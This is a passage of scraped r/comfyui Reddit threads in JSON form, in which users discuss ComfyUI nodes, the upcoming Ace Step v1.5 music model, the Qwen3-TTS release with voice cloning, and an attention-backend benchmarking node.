          "author": "ANR2ME",
          "text": "Btw, what's the output string (source code)blooked like? in which language is the output source code? ü§î",
          "score": 1,
          "created_utc": "2026-01-23 12:31:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18800c",
              "author": "skbphy",
              "text": "It simply passes the code written in the editor or settings node as a string. It‚Äôs not important on its own. I added it for automation.",
              "score": 2,
              "created_utc": "2026-01-23 12:38:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o19cj0l",
          "author": "35point1",
          "text": "So basically this is a code snippet generator node with a built in preview and customized widget ui‚Ä¶\n\nI‚Äôve never used those libraries you mentioned but does your node just spit out a js function or similar to produce a canvas animation? I really like the customization to accomplish this!",
          "score": 1,
          "created_utc": "2026-01-23 16:07:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5hz9",
              "author": "skbphy",
              "text": "Pretty much but it‚Äôs more than a snippet generator. it actually runs the code with a live preview and you can even turn // uniform ... comments into UI sliders / color pickers.  here  [https://github.com/SKBv0/ComfyUI\\_CreativeCode?tab=readme-ov-file#interactive-uniforms](https://github.com/SKBv0/ComfyUI_CreativeCode?tab=readme-ov-file#interactive-uniforms)",
              "score": 1,
              "created_utc": "2026-01-24 00:06:21",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1l0xtf",
          "author": "InoSim",
          "text": "I can't read because of video quality... are the buttons you click able to be setup ? like i create a new one with my own parameters ?",
          "score": 1,
          "created_utc": "2026-01-25 08:04:27",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qmy83p",
      "title": "Ace Step v1.5 almost ready",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmy83p",
      "author": "iChrist",
      "created_utc": "2026-01-25 22:50:12",
      "score": 148,
      "num_comments": 33,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmy83p/ace_step_v15_almost_ready/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1plum0",
          "author": "_Ruffy_",
          "text": "Wow, easy LoRA training with just 12gigs of VRAM? Thats gonna change things.",
          "score": 17,
          "created_utc": "2026-01-25 22:53:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ppxo0",
              "author": "iChrist",
              "text": "Yep it‚Äôs exciting but I am here for the 3-5 seconds generations.\nHeartMula which is also good takes 2 minutes which is just not worth it with all the re-rolls due to model not adhering to tags.\n\nAce step v1.5 will fix all of those issues",
              "score": 8,
              "created_utc": "2026-01-25 23:11:54",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1puirs",
                  "author": "ANR2ME",
                  "text": "I heard ACE-Step also supports more languages than HeartMula ü§î",
                  "score": 1,
                  "created_utc": "2026-01-25 23:33:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1rd6c2",
              "author": "urabewe",
              "text": "Admin on the discord said it also trains at just about the same speed as inference. They made a Lora with 8 data samples and only 20 minutes. Crazy",
              "score": 3,
              "created_utc": "2026-01-26 04:17:18",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1qapij",
          "author": "shiftdeleat",
          "text": "incredible, have been waiting years for this. suno is great, but their copyright is so aggressive, and anything uploaded is used for training - no opt out.",
          "score": 9,
          "created_utc": "2026-01-26 00:52:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qfd4k",
              "author": "iChrist",
              "text": "I just asked in discord and the developer told me that it‚Äôs 10 times faster than v1\n\nA full song should take 1-2 seconds on a 3090 ü§Ø",
              "score": 8,
              "created_utc": "2026-01-26 01:15:50",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r0tmy",
                  "author": "FaceDeer",
                  "text": "At some point I'll be able to tell my personal assistant \"play a soundtrack to my life, please\" and it'll just go.\n\nNot sure what I'll do when the background music turns ominous and creepy, though.",
                  "score": 3,
                  "created_utc": "2026-01-26 03:04:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1qcjxu",
          "author": "reality_comes",
          "text": "How do you get in their discord?",
          "score": 3,
          "created_utc": "2026-01-26 01:01:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qcvd3",
              "author": "iChrist",
              "text": "Listed in the Github.\n\n[https://discord.gg/PeWDxrkdj7](https://discord.gg/PeWDxrkdj7)\n\nhttps://preview.redd.it/cg0kn1p2flfg1.jpeg?width=1179&format=pjpg&auto=webp&s=288555a452ab360edea011e5a88fd566aa9eb028",
              "score": 5,
              "created_utc": "2026-01-26 01:03:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1sxbif",
          "author": "LepoRaf",
          "text": "It supports 50 languages ‚Äã‚Äãüòâ Have faith, tomorrow you will be very happy üòâ",
          "score": 3,
          "created_utc": "2026-01-26 11:51:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1q1a1e",
          "author": "Eydahn",
          "text": "This is massiveüôåüèª Can‚Äôt wait!",
          "score": 2,
          "created_utc": "2026-01-26 00:06:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1re79m",
          "author": "xcdesz",
          "text": "Is this version going to have a text to music, or music to music?  I seem to remember the last version you fed it some music, and it started out similar to the song, and then diverged into something different.  Although you did feed it lyrics.",
          "score": 1,
          "created_utc": "2026-01-26 04:23:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rh7yg",
              "author": "iChrist",
              "text": "It has text2music with optional thinking mode to expand the user prompt and add instruments and the structure of the song.\n\nIt also supports music2music, look at the second image I uploaded to the post.\n\nThey shared examples and it‚Äôs promising.",
              "score": 3,
              "created_utc": "2026-01-26 04:43:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1tuj1y",
          "author": "Fancy-Future6153",
          "text": "When we can try to use Ace Step 1.5 in ComfyUI? :)",
          "score": 1,
          "created_utc": "2026-01-26 15:03:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1qxi3c",
          "author": "mallibu",
          "text": "Can we stop with the hypings in this sub.\n\nWe don't give a shit about paragraphs and previews, give us the model/tool and if it's good it's gonna take off in a few hours.",
          "score": -8,
          "created_utc": "2026-01-26 02:47:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r1ej6",
              "author": "iChrist",
              "text": "I would normally not hype something, but this is really exciting and has great previews and a very responsive dev.\nJust wanted more attention towards that project.",
              "score": 5,
              "created_utc": "2026-01-26 03:08:02",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r7e9e",
                  "author": "mallibu",
                  "text": "it's great actually, don't get me wrong. It's just there's hyping for this and that here all the time for random bs which causes fatigue. \n\nLike, files to download, or I'm out. The lads below and above me can read all the previews they want.",
                  "score": 0,
                  "created_utc": "2026-01-26 03:42:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r18rs",
              "author": "FaceDeer",
              "text": "I'm actually appreciative of this post, I was thinking of testing out HeartMula in the next day or two and this means I can now put it off a little longer to wait for the popular reaction.",
              "score": 8,
              "created_utc": "2026-01-26 03:07:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1r2cau",
                  "author": "iChrist",
                  "text": "I wouldn‚Äôt pass on HeartMula to be honest.\nIts limited in terms of adherence to tags and has no way of generating just instrumentals, but it can deliver bangers!",
                  "score": 4,
                  "created_utc": "2026-01-26 03:13:11",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r5p3x",
              "author": "nymical23",
              "text": "For ambiguous tweets and speculations? Sure, that's annoying and a waste of time.\n\nBut this seems to be genuine preparations for a new model and many are already waiting for this. So, this is a good post I'd say.",
              "score": 2,
              "created_utc": "2026-01-26 03:32:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1rczmk",
              "author": "shiftdeleat",
              "text": "agree re:hype thing but this is actually something different and i appreciate the  info tbh",
              "score": 2,
              "created_utc": "2026-01-26 04:16:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qme5g3",
      "title": "Qwen3-TTS has been officially released as open source, boasting powerful features such as speech generation, voice design, and voice cloning.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qme5g3",
      "author": "Daniel81528",
      "created_utc": "2026-01-25 08:57:56",
      "score": 142,
      "num_comments": 29,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qme5g3/qwen3tts_has_been_officially_released_as_open/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1lc0n9",
          "author": "n0714",
          "text": "is this for ComfyUI?",
          "score": 9,
          "created_utc": "2026-01-25 09:41:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1n9v1i",
              "author": "Paganator",
              "text": "[This GitHub page](https://github.com/1038lab/ComfyUI-QwenTTS) has the ComfyUI nodes.",
              "score": 9,
              "created_utc": "2026-01-25 16:51:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1mw60q",
          "author": "MisterBlackStar",
          "text": "Leaving my ComfyUI nodes here just in case, as a web UI isn't really related with this sub theme [ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
          "score": 9,
          "created_utc": "2026-01-25 15:51:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1nhu3t",
              "author": "TopTippityTop",
              "text": "Do you know if there's any way to do realtime streaming in comfy?¬†",
              "score": 2,
              "created_utc": "2026-01-25 17:25:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1l7mj4",
          "author": "Gloomy-Radish8959",
          "text": "Exciting!",
          "score": 2,
          "created_utc": "2026-01-25 09:02:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nhnb6",
          "author": "TopTippityTop",
          "text": "Does anyone know whether there's a way to do realtime streaming in comfy? How does that aspect work?",
          "score": 2,
          "created_utc": "2026-01-25 17:24:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1o4wj6",
          "author": "OkBill2025",
          "text": "I'll stick with VibeVoice",
          "score": 2,
          "created_utc": "2026-01-25 19:01:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1obypa",
              "author": "MrWeirdoFace",
              "text": "Question, can you remind me what happened with it?  Rather I never got around to testing it but I know there was some controversy and they temporarily pulled it to replace the models.   I've been sitting a a pre-pull copy but haven't taken a look.",
              "score": 3,
              "created_utc": "2026-01-25 19:31:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1qy4km",
                  "author": "OkBill2025",
                  "text": "It's from the previous version. I don't know what happened, but I'm still using the old model.",
                  "score": 1,
                  "created_utc": "2026-01-26 02:51:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1le4gv",
          "author": "PleasantAd2256",
          "text": "Comfyui workflow?",
          "score": 4,
          "created_utc": "2026-01-25 10:00:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1lhsug",
          "author": "Mirandah333",
          "text": "Anyone was able to clone a voice? For me it fails completely...",
          "score": 2,
          "created_utc": "2026-01-25 10:33:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lv1s7",
              "author": "aeroumbria",
              "text": "It appears to work slightly better with captioned input vs audio alone, but it is really only similar in vocal quality and not speech patterns and mannerism as well, like VibeVoice. I suppose the custom voice model is supposed to pick up the task of adding these qualities, but not sure if these two modes can be combined together.",
              "score": 5,
              "created_utc": "2026-01-25 12:24:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1lw5r8",
              "author": "JScoobyCed",
              "text": "I have been using Spark-TTS (self-hosted) in a project last year and it was amazing. You just need a 5-10 second audio sample. Make sure the audio sample rate is 16k, preferably .wav, and no pause/silence in it (or it will generate voice with silence parts)",
              "score": 2,
              "created_utc": "2026-01-25 12:33:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n8x8c",
              "author": "HolidayWheel5035",
              "text": "I‚Äôm using comfyui nodes but yes the clone works perfect.   Way better than vibevoice imho",
              "score": 2,
              "created_utc": "2026-01-25 16:47:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n1d50",
              "author": "fartshitcumpiss",
              "text": "The voice cloner works perfectly for me, you just need to provide an accurate transcript of the sample. If you're having issues with the cloned voice sounding bland, crank up the temperature and top\\_k, and maybe the repetition penalty. The weirder the voice, the more temp and top\\_k you need. Also, seed matters, so just generate repeatedly with random seeds until you get a good one.",
              "score": 3,
              "created_utc": "2026-01-25 16:14:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1n3tgs",
                  "author": "Mirandah333",
                  "text": "Thnaks, need to try more and insist more. It was a first bad impression",
                  "score": 2,
                  "created_utc": "2026-01-25 16:25:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1p87qo",
              "author": "niord",
              "text": "Works perfect without extra caption.\n\nJust remember to have the 'something x vectors only' switched to true on the node if you feed it with audio and no caption.",
              "score": 1,
              "created_utc": "2026-01-25 21:53:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1lpkwz",
              "author": "Daniel81528",
              "text": "How could that be? My tests are all working fine, what's wrong with you?",
              "score": -2,
              "created_utc": "2026-01-25 11:41:14",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lrhpb",
                  "author": "Mirandah333",
                  "text": "It produces a voice that changes over time",
                  "score": 1,
                  "created_utc": "2026-01-25 11:56:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1mndp9",
          "author": "XonikzD",
          "text": "Is it as good a index-tts2?",
          "score": 1,
          "created_utc": "2026-01-25 15:11:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1p2f5a",
          "author": "Mythril_Zombie",
          "text": "How fast is it?",
          "score": 1,
          "created_utc": "2026-01-25 21:27:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1p9dgu",
              "author": "niord",
              "text": "On my laptop (rtx 4080 mobile 12gb) a 30s TTS takes 3-5min to 'render' (that is with around 1m voice sample as base).",
              "score": 2,
              "created_utc": "2026-01-25 21:58:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1px5si",
                  "author": "harrro",
                  "text": "You sure it's using the GPU? It should be way faster than that.",
                  "score": 2,
                  "created_utc": "2026-01-25 23:46:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v6us3",
          "author": "ovannesag",
          "text": "https://preview.redd.it/2haq5tbbmqfg1.png?width=1043&format=png&auto=webp&s=42c4cb96012a52283bbf3f457319d07ba2344a7e\n\nI'm using the portable version",
          "score": 0,
          "created_utc": "2026-01-26 18:33:10",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qnmten",
      "title": "Did you know one simple change can make ComfyUI generations up to 3x faster? But I need your help :) Auto-benchmark attention backends.",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/rzkcxlam9qfg1.png",
      "author": "D_Ogi",
      "created_utc": "2026-01-26 17:36:47",
      "score": 139,
      "num_comments": 52,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qnmten/did_you_know_one_simple_change_can_make_comfyui/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1vgfbv",
          "author": "OnceWasPerfect",
          "text": "Couple questions if you don't mind:\n\n1.  Should i take out my --sage-attention flag from my bat?  \n2.  If i use multiple models and multiple ksamplers in a workflow, say initially making a gen with klein and then doing a refinement pass with zimage how does this node affect that, can the attention mechanisms be changed on the fly like that or is it one attention per run?  If it can be changed on the fly do I put one of these nodes in front of each ksampler?   \n3.  Is there any added time for the first one while its collecting the data? \n\nThanks!",
          "score": 22,
          "created_utc": "2026-01-26 19:13:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1vunwt",
              "author": "pwillia7",
              "text": "+1 leaving a note to check back for answers I have the same question",
              "score": 3,
              "created_utc": "2026-01-26 20:15:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1x3a8s",
              "author": "Icy_Concentrate9182",
              "text": "The flag is no longer needed unless you need to force it in some edge case",
              "score": 2,
              "created_utc": "2026-01-26 23:42:01",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1vbhd8",
          "author": "D_Ogi",
          "text": "Here‚Äôs what the JSON report looks like after I parse it on my setup: per-backend attention times in ms, with the winner highlighted.\n\nhttps://preview.redd.it/ch6zya9spqfg1.png?width=1063&format=png&auto=webp&s=413d68cbe9ebf15f6daff4006d48d4ebd00e2a2b",
          "score": 9,
          "created_utc": "2026-01-26 18:52:26",
          "is_submitter": true,
          "replies": [
            {
              "id": "o1vi76t",
              "author": "alb5357",
              "text": "Sage is twice as fast as flash attending here. Is that sage 2?",
              "score": 2,
              "created_utc": "2026-01-26 19:20:51",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1vplj4",
                  "author": "D_Ogi",
                  "text": "It's Sage 2 Auto which I assume switched to the \"sage\\_fp8\\_cuda\\_fast\" kernel.",
                  "score": 2,
                  "created_utc": "2026-01-26 19:52:51",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1xpmiw",
              "author": "harderisbetter",
              "text": "noob here, so I can't use your node to speed up my z- image wf, right? Since it's not listed in your repo, and cos the official wf don't have sageattn?",
              "score": 1,
              "created_utc": "2026-01-27 01:38:48",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1y5jcp",
                  "author": "D_Ogi",
                  "text": "Yes, you can. Honestly, I did the above benchmark using z-image turbo.",
                  "score": 2,
                  "created_utc": "2026-01-27 03:05:42",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v1u30",
          "author": "ChromaBroma",
          "text": "If only I could get sageattn3 to actually work on my pc. But it's cool that your node can benchmark it. I've been wanting to compare sageattn2 vs 3 in terms of quality and speed on my own hardware. Any tips on how to get sageattn3 to work well? Ideally without messing up sageattn2.",
          "score": 6,
          "created_utc": "2026-01-26 18:12:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v3qvh",
              "author": "D_Ogi",
              "text": "Yeah, SageAttn3 has been a bit of a ‚Äúbleeding edge tax‚Äù so far.\n\nSageAttention2 already has multiple kernels/variants, so ‚ÄúSageAttn2‚Äù is not just one thing. Depending on your install and GPU, different SA2 flavors can win.\n\nSageAttention3 is basically Blackwell-only in practice, because it leans on FP4 / Blackwell-specific capabilities. So on an RTX 4090 (Ada) it is expected to not work. I only have a 4090 myself, so I can‚Äôt validate SA3 locally, which is part of why I‚Äôm asking the community to test.",
              "score": 7,
              "created_utc": "2026-01-26 18:20:15",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1w1p9e",
                  "author": "xb1n0ry",
                  "text": "Is SA3 optimized for fp4 only like the new nvfp4 models or does it help with fp8/16 and gguf too? Using a 5090. Will the sage auto even use SA3 or do the nodes have to support SA3 explicitly?",
                  "score": 1,
                  "created_utc": "2026-01-26 20:46:11",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1wb604",
              "author": "VladyCzech",
              "text": "I don‚Äôt think it is wise to use SageAttention 3 giving speed while lowering output quality compared to SA2. SA3 is probably better use in first pass only and then do refine with SA2 or pure model. SA3 has specific use case scenarios.",
              "score": 1,
              "created_utc": "2026-01-26 21:28:16",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1v2fzp",
          "author": "Eshinio",
          "text": "When using this, should I remove/bypass all current nodes in my workflow that enable SageAttention or fp16\\_accumulation and then let your node do its thing?\n\nAlso, if I already use the latest Sageattention by default (having a RTX 3090, so can't use more modern features), is there still any reason to use it?",
          "score": 5,
          "created_utc": "2026-01-26 18:14:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yjvmk",
          "author": "oneFookinLegend",
          "text": "I wasted like one hour with this. Following the instructions broke my comfyui install. I had to learn 10 new things in order to fix it.",
          "score": 3,
          "created_utc": "2026-01-27 04:31:27",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1waydg",
          "author": "ANR2ME",
          "text": "Btw, can it be added to support more attentions for GPUs that doesn't support standard FlashAttention2+ ü§î\n\nFor example:\n- flash-attn-triton\n- flash-linear-attention\n- aule-attention",
          "score": 3,
          "created_utc": "2026-01-26 21:27:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wcrxi",
          "author": "YMIR_THE_FROSTY",
          "text": "In case you have 10xx era GPU, you dont need to bother much. There are like two options and odds are you already use fastest. :D\n\nIt starts to become interesting at 30xx era and newer.",
          "score": 3,
          "created_utc": "2026-01-26 21:35:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v10j8",
          "author": "Busy_Aide7310",
          "text": "How much speed increase can I expect from using that node on Wan 2.2, vs using SageAttention2?",
          "score": 3,
          "created_utc": "2026-01-26 18:08:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v2f99",
              "author": "D_Ogi",
              "text": "If you‚Äôre already running the fastest option on your machine, the speedup from my node is basically 0%. The node doesn‚Äôt ‚Äústack‚Äù extra acceleration on top of SageAttention2, it just chooses the fastest attention implementation available (or the fastest Sage variant) for your GPU + model + seq\\_len.\n\nThe catch is: you usually don‚Äôt know what‚Äôs fastest ahead of time. SageAttention2 itself has multiple variants / kernels (and there are also SageAttention2++ style variants depending on what you installed), and sometimes FlashAttention (2/3) or another backend can win on certain GPUs / shapes.\n\nSo the real answer is: could be 0%, could be noticeable and the whole point of the node is to benchmark your setup once and stop guessing.",
              "score": 16,
              "created_utc": "2026-01-26 18:14:42",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vwezd",
                  "author": "the_friendly_dildo",
                  "text": "So to be clear, you need all of the different variants installed correctly for this to work right?",
                  "score": 3,
                  "created_utc": "2026-01-26 20:22:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1uy31f",
          "author": "an80sPWNstar",
          "text": "I love this idea. When you say it's global, what exactly do you mean? It writes this data to ComfyUI itself to be used for all future renders on that particular model or just workflow? What if your workflow doesn't include the sage attention/torch/triton nodes? Will it still work?",
          "score": 2,
          "created_utc": "2026-01-26 17:56:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v05l5",
              "author": "D_Ogi",
              "text": "Thanks! By ‚Äúglobal‚Äù I mean it applies at runtime to the current ComfyUI session (the Python process), not just a single node branch. Once the Attention Optimizer node executes, the selected attention backend is used for the rest of that run and subsequent renders in the same session, regardless of which workflow you run next, until you change it again or restart ComfyUI. The only thing persisted to disk is the benchmark cache (`benchmark_db.json`) so future runs can pick the same winner instantly.\n\nYou also do not need to add any separate SageAttention / Flash / xFormers nodes to the workflow. This node detects what‚Äôs installed, benchmarks only the available backends, and applies the fastest (or your forced choice). If a backend isn‚Äôt installed it‚Äôs skipped during benchmarking, and if you force a backend that‚Äôs not available it falls back to PyTorch SDPA and reports it.",
              "score": 7,
              "created_utc": "2026-01-26 18:05:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1v1nyc",
                  "author": "an80sPWNstar",
                  "text": "Holy moly, that's pretty freaking amazing! I'll give it a shot and let you know if I have any questions.",
                  "score": 3,
                  "created_utc": "2026-01-26 18:11:33",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1w19a2",
                  "author": "susne",
                  "text": "I have a 4090 16gb variant with xformers disabled, pytorch cross attention default, and i use sage2 sometimes with the kjnodes patches. I'm guessing i should remove any enabling/disabling for it to function properly?\n\nAre there any models it doesn't work with?",
                  "score": 1,
                  "created_utc": "2026-01-26 20:44:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v7jiu",
          "author": "RIP26770",
          "text": "Does it work with PyTorch XPU (Intel Arc iGPU and GPU) ?",
          "score": 2,
          "created_utc": "2026-01-26 18:36:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v8r9h",
              "author": "D_Ogi",
              "text": "I have no idea, but that's the point of this post!  :)",
              "score": 2,
              "created_utc": "2026-01-26 18:41:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1vk4ji",
          "author": "ThiagoAkhe",
          "text": "Thank you!",
          "score": 2,
          "created_utc": "2026-01-26 19:29:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1vpoht",
              "author": "D_Ogi",
              "text": "Let me know if it works for you, please!",
              "score": 2,
              "created_utc": "2026-01-26 19:53:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vyx6q",
                  "author": "ThiagoAkhe",
                  "text": "https://preview.redd.it/u5y005en6rfg1.png?width=1985&format=png&auto=webp&s=c0f05ebe351e6e17edf3f0703cbe454130d79701\n\nGPU: Rxt 4060 8gb   \n  \nOS: Windows 11  \n  \nModel: Z-Image  \n  \nseq\\_len: 8192  \n  \nBest backend + speedup: img  \n  \nNotes (quality/stability, VRAM, any errors): I read the compatible models listed on your GitHub, but I wanted to test it with Z-Image. Everything worked correctly, but the only error I encountered was a message saying it couldn‚Äôt detect which version of SageAttention I had installed, even though it was version 2.1.1 and properly installed => ..dtype: float16 | head\\_dim: 128 | seq\\_len: 8192 | CUDA: 13.0 | Triton: 3.5.1  \n**SageAttention: vunknown**",
                  "score": 1,
                  "created_utc": "2026-01-26 20:33:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vuqbh",
          "author": "pwillia7",
          "text": "Really cool idea thanks for building and releasing",
          "score": 2,
          "created_utc": "2026-01-26 20:15:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1y318w",
          "author": "separatelyrepeatedly",
          "text": "fails for wan 2.2 ComfyUI-WanMoeKSampler node. I need to do more testing.",
          "score": 2,
          "created_utc": "2026-01-27 02:52:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v51sq",
          "author": "ReasonablePossum_",
          "text": "Question, does running comfyui w sage attention accelerates image generation in general or only on certain workflows?",
          "score": 1,
          "created_utc": "2026-01-26 18:25:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v71uu",
              "author": "D_Ogi",
              "text": "In general it speeds up generation across most workflows (like other attention/back-end optimizations), but the exact ‚Äúwhen and why‚Äù depends on your model, resolution, and node graph, which is basically the whole point of that post :)",
              "score": 1,
              "created_utc": "2026-01-26 18:33:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vhkp1",
                  "author": "GreyScope",
                  "text": "& gpu",
                  "score": 2,
                  "created_utc": "2026-01-26 19:18:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1vdasv",
                  "author": "ReasonablePossum_",
                  "text": "So the node works on a workflow by workflow basis and not in absolute system wide optimization?\n\nBecause I just managed to install sage, and was wondering if I should just always launch comfyui with it.",
                  "score": 1,
                  "created_utc": "2026-01-26 19:00:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vtobn",
          "author": "NickCanCode",
          "text": "Looks like the node doesn't provide an option to select a card? I have both 5070 and 3060 installed.",
          "score": 1,
          "created_utc": "2026-01-26 20:10:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wy36l",
          "author": "Southern-Chain-6485",
          "text": "This is interesting, but isn't the answer that Sage Attention is faster if the model supports it (ie, not Qwen)? Is there any model in which something is faster than Sage?",
          "score": 1,
          "created_utc": "2026-01-26 23:15:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1x67ln",
          "author": "Icy_Concentrate9182",
          "text": "Sage attention 2.2+ should be the fastest across all workflows for most cases.\n\nSA3 is even faster, but the current implementation means it fails in some stages and has to be selectively enabled and disabled within the workflow. \n\nThis is more to satisfy curiosity, but I'm happy to be corrected.",
          "score": 1,
          "created_utc": "2026-01-26 23:57:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yf5dy",
          "author": "blackhuey",
          "text": "Is this worth trying on lower VRAM rigs? My key \"speed\" factor is whether I run out of VRAM and start paging, not necessarily which workflow is technically faster.",
          "score": 1,
          "created_utc": "2026-01-27 04:01:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1z9er9",
          "author": "Abject-Recognition-9",
          "text": ":(  i cant get this to work, as soon as is run comfy stop and i need reboot",
          "score": 1,
          "created_utc": "2026-01-27 07:47:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v5293",
          "author": "AmeenRoayan",
          "text": "![gif](giphy|KvD3fWqBEiZwyLjKu8)",
          "score": 1,
          "created_utc": "2026-01-26 18:25:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1weeyh",
          "author": "Upset-Virus9034",
          "text": "Is this real, should I read all the discussion?\n\n![gif](giphy|JULfVYQH3XkCxMV0QP)",
          "score": 1,
          "created_utc": "2026-01-26 21:42:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ux920",
          "author": "Electrical_Car6942",
          "text": "Hmm",
          "score": -5,
          "created_utc": "2026-01-26 17:52:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1uxgbm",
              "author": "D_Ogi",
              "text": "yup?",
              "score": 5,
              "created_utc": "2026-01-26 17:53:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vu9yx",
                  "author": "mallibu",
                  "text": "Hmmmm",
                  "score": 0,
                  "created_utc": "2026-01-26 20:13:17",
